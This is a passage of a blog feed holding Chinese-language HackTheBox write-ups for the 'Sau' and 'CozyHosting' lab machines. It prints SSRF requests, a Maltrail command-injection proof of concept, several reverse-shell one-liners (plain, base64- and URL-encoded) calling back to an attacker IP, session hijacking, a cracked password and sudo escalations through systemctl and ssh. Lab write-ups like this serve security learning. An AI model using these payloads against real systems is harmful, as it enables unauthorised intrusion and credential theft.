class=\"line\">SF:Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n40</span><br><span class=\"line\">SF:0\\x20Bad\\x20Request&quot;)%r(LDAPSearchReq,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Re</span><br><span class=\"line\">SF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x</span><br><span class=\"line\">SF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;);</span><br><span class=\"line\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></p>\n<p>访问 55555 端口发现提示貌似代理访问的东西，那很直接了 ssrf 直接设置访问 127.0.0.1:80 端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/baskets/add HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.224:55555</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 142</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,</span><br><span class=\"line\">  &quot;proxy_response&quot;: true,</span><br><span class=\"line\">  &quot;insecure_tls&quot;: false,</span><br><span class=\"line\">  &quot;expand_path&quot;: true,</span><br><span class=\"line\">  &quot;capacity&quot;: 250</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这样的话访问路由 add 就相当于访问 http://127.0.0.1:80，接下来访问 add 端口后对其进行目录扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -w &quot;D:\\wordlist\\directoryDicts\\Filenames_or_Directories_All.txt&quot; --hc 404,502 http://10.10.11.224:55555/add/FUZZ</span><br></pre></td></tr></table></figure></p>\n<p>扫描了一些发现已经扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000132:   200        2 L      4 W        26 Ch       &quot;robots.txt&quot;</span><br><span class=\"line\">000000240:   200        73 L     276 W      15051 Ch    &quot;favicon.ico&quot;</span><br><span class=\"line\">000000311:   200        111 L    432 W      7091 Ch     &quot;index&quot;</span><br><span class=\"line\">000000252:   401        0 L      2 W        12 Ch       &quot;login&quot;</span><br><span class=\"line\">000001986:   401        0 L      0 W        0 Ch        &quot;events&quot;</span><br><span class=\"line\">000005704:   200        0 L      1 W        4 Ch        &quot;ping&quot;</span><br></pre></td></tr></table></figure></p>\n<p>接下来一个一个查看路由，index 下提示了这个使用的什么服务</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Powered by Maltrail (v0.53)</span><br><span class=\"line\">Hide threat</span><br><span class=\"line\">Report false positive</span><br></pre></td></tr></table></figure></p>\n<p>去网上找找这个服务的漏洞</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">maltrail是开源的恶意流量检测系统，项目地址：https://github.com/stamparm/maltrail。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>查到了这个项目的漏洞了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">描述</span><br><span class=\"line\">Maltrail &lt;= v0.54 在登录过程中容易受到未经身份验证的操作系统命令注入的影响。</span><br><span class=\"line\"></span><br><span class=\"line\">总结</span><br><span class=\"line\">mailtrail/core/http.py 中的函数在参数中包含命令注入漏洞。subprocess.check_outputparams.get(&quot;username&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">攻击者可以通过将任意操作系统命令注入 username 参数来利用此漏洞。注入的命令将以正在运行的进程的权限执行。此漏洞无需身份验证即可远程利用。</span><br><span class=\"line\"></span><br><span class=\"line\">概念验证</span><br><span class=\"line\">curl &#x27;http://hostname:8338/login&#x27; \\</span><br><span class=\"line\">  --data &#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br><span class=\"line\">冲击</span><br><span class=\"line\">任意命令执行</span><br></pre></td></tr></table></figure></p>\n<p>也就是说在 login 页面发送 username=;`` 就能任意命令执行</p>\n<p>虽然能够执行命令但是无法直接回显出内容很操作</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>直接反弹 shell</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>\n<p>使用 urlencode</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%62%61%73%68%24%7b%49%46%53%7d%2d%69%24%7b%49%46%53%7d%3e%26%24%7b%49%46%53%7d%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%34%2f%39%39%39%39%24%7b%49%46%53%7d%30%3e%26%31</span><br></pre></td></tr></table></figure></p>\n<p>发现反弹不上去</p>\n<p>使用获取反弹试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地写一个shell.sh然后在使用python -m http.server</span><br><span class=\"line\">相当于本地开启了8000端口</span><br><span class=\"line\">`curl 10.10.14.54:8000/shell.sh|bash`</span><br></pre></td></tr></table></figure></p>\n<p>不晓得为什么不行</p>\n<p>那直接使用其他的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><br><span class=\"line\">&quot;10.10.14.54&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">curl &#x27;http://10.10.11.224:55555/add/login&#x27; --data &#x27;username=;`echo &quot;cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoCiIxMC4xMC4xNC41NCIsOTk5OSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw==&quot;|base64 -d|sh`&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listening on [any] 9999 ...</span><br><span class=\"line\">connect to [10.10.14.54] from (UNKNOWN) [10.10.11.224] 37542</span><br><span class=\"line\">puma@sau:/opt/maltrail$ ls</span><br></pre></td></tr></table></figure></p>\n<p>在 puma 的目录下就有一个 flag</p>\n<h4 id=\"提取\"><a class=\"anchor\" href=\"#提取\">#</a> 提取</h4>\n<p>使用 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matching Defaults entries for puma on sau:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User puma may run the following commands on sau:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure></p>\n<p>提示能执行 systemctl</p>\n<p>那好办了</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gtfobins.github.io/gtfobins/systemctl/</span><br></pre></td></tr></table></figure></p>\n<p>直接照搬 exp 的话可能需要你输入 puma 的密码这个时候就只有使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/systemctl status trail.service</span><br><span class=\"line\">!sh</span><br></pre></td></tr></table></figure></p>\n<p>因为上面现在不需要密码的只有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure></p>\n<p>然后在 root 目录下得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-CozyHosting/",
            "url": "https://lookhui.github.io/HTB-CozyHosting/",
            "title": "HTB-CozyHosting",
            "date_published": "2023-12-13T11:29:44.000Z",
            "content_html": "<h1 id=\"cozyhosting\"><a class=\"anchor\" href=\"#cozyhosting\">#</a> CozyHosting</h1>\n<p>nmap 扫描靶机</p>\n<p>同时访问靶机</p>\n<p>url 变成了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://cozyhosting.htb/</span><br></pre></td></tr></table></figure></p>\n<p>这个时候把这个域名加到 hosts</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.230 cozyhosting.htb</span><br></pre></td></tr></table></figure></p>\n<p>使用 nmap 普通扫描扫描内容如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 19:38 中国标准时间</span><br><span class=\"line\">Nmap scan report for cozyhosting.htb (10.10.11.230)</span><br><span class=\"line\">Host is up (0.34s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds</span><br></pre></td></tr></table></figure></p>\n<p>先从 80 端口下手</p>\n<p>先扫描目录</p>\n<p>目录扫描扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000022:   401        0 L      1 W        97 Ch       &quot;admin&quot;</span><br><span class=\"line\">000000251:   200        96 L     196 W      4431 Ch     &quot;login&quot;</span><br><span class=\"line\">000000314:   500        0 L      1 W        73 Ch       &quot;error&quot;</span><br><span class=\"line\">000000310:   200        284 L    745 W      12706 Ch    &quot;index&quot;</span><br><span class=\"line\">000013836:   204        0 L      0 W        0 Ch        &quot;logout&quot;</span><br><span class=\"line\">000017286:   400        0 L      32 W       431 Ch      &quot;system\\&quot;</span><br></pre></td></tr></table></figure></p>\n<p>访问 error 报错爆的是 java 的 spring boot 框架的错误，使用专门扫路由的字典扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">actuator</span><br></pre></td></tr></table></figure></p>\n<p>访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://cozyhosting.htb/actuator</span><br></pre></td></tr></table></figure></p>\n<p>查看到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;_links&quot;: &#123;</span><br><span class=\"line\">    &quot;self&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;sessions&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/sessions&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;beans&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/beans&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;health&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/health&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;health-path&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/health/&#123;*path&#125;&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;env&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/env&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;env-toMatch&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/env/&#123;toMatch&#125;&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;mappings&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/mappings&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>访问 sessions 路由得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;3FFF49C67E9B7FE5A7B867EA4AF08D00&quot;: &quot;kanderson&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个应该是 JSESSIONID</p>\n<p>也就是 cookie 以这个 jsessionid 去访问 admin 路由</p>\n<p>然后进去 admin 网页后能看到这个 ssh 的连接方式，我们使用 ' 能够测试出这个的报错</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Location: http://cozyhosting.htb/admin?error=</span><br><span class=\"line\">/bin/bash: -c: line 1: unexpected EOF while looking for matching `&#x27;&#x27;</span><br><span class=\"line\">/bin/bash: -c: line 2: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p>\n<p>这样的话我们试试反弹 shell</p>\n<p>尝试了直接反弹发现没有一点反应那就</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class=\"line\">得到base64</span><br><span class=\"line\">然后在构造解码</span><br><span class=\"line\">;echo$&#123;IFS&#125;&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC85OTk5IDA+JjEK&quot;|base64$&#123;IFS&#125;-d|$&#123;IFS&#125;bash;</span><br><span class=\"line\">直接上传发现还是不行，那就使用url加密一下如</span><br><span class=\"line\">%3b%65%63%68%6f%24%7b%49%46%53%7d%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4e%43%38%35%4f%54%6b%35%49%44%41%2b%4a%6a%45%4b%22%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%7c%24%7b%49%46%53%7d%62%61%73%68%3b</span><br></pre></td></tr></table></figure></p>\n<p>然后本地开启监听</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功，</p>\n<p>ls 看到 app 下面的 jar 包</p>\n<p>然后在通过 nc 或者 python 从上面把这个 jar 包下载到本地进行分析</p>\n<p>在看看用户执行 cat /etc/passwd</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class=\"line\">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class=\"line\">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class=\"line\">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class=\"line\">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class=\"line\">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class=\"line\">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class=\"line\">app:x:1001:1001::/home/app:/bin/sh</span><br><span class=\"line\">postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class=\"line\">josh:x:1003:1003::/home/josh:/usr/bin/bash</span><br><span class=\"line\">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></p>\n<p>这种渗透我们一定要注意的是这些有 /bin/sh 的也就是能够执行命令的用户</p>\n<p>如 josh 和 postgres 以及 app</p>\n<p>下载好后直接通过 jd-gui 来直接进行反编译分析</p>\n<p>通过查看 application.properties 得到了 PostgreSQL 数据库账号以及密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psql -h 127.0.0.1 -U postgres</span><br></pre></td></tr></table></figure></p>\n<p>这个数据库使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\c cozyhosting</span><br><span class=\"line\"></span><br><span class=\"line\">\\d</span><br><span class=\"line\">select * from users;</span><br></pre></td></tr></table></figure></p>\n<p>得到密码的 hash 值</p>\n<p>通过非常牛逼的 join 来对 hash 值进行破解</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john ./admin.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br></pre></td></tr></table></figure></p>\n<p>通过 john 解出密码为</p>\n<p>manchesterunited</p>\n<p>我们去尝试使用 josh 去 ssh 登录</p>\n<p>发现登录成功并且在目录下还有一个 user.txt 这个就是我们的第一个 flag</p>\n<p>尝试提取</p>\n<p>sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matching Defaults entries for josh on localhost:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User josh may run the following commands on localhost:</span><br><span class=\"line\">    (root) /usr/bin/ssh *</span><br></pre></td></tr></table></figure></p>\n<p>发现竟然能调动 root 的 /usr/bin/ssh</p>\n<p>那好办多了</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gtfobins.github.io/gtfobins/ssh/#sudo</span><br></pre></td></tr></table></figure></p>\n<p>使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure></p>\n<p>输入密码得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        }
    ]
}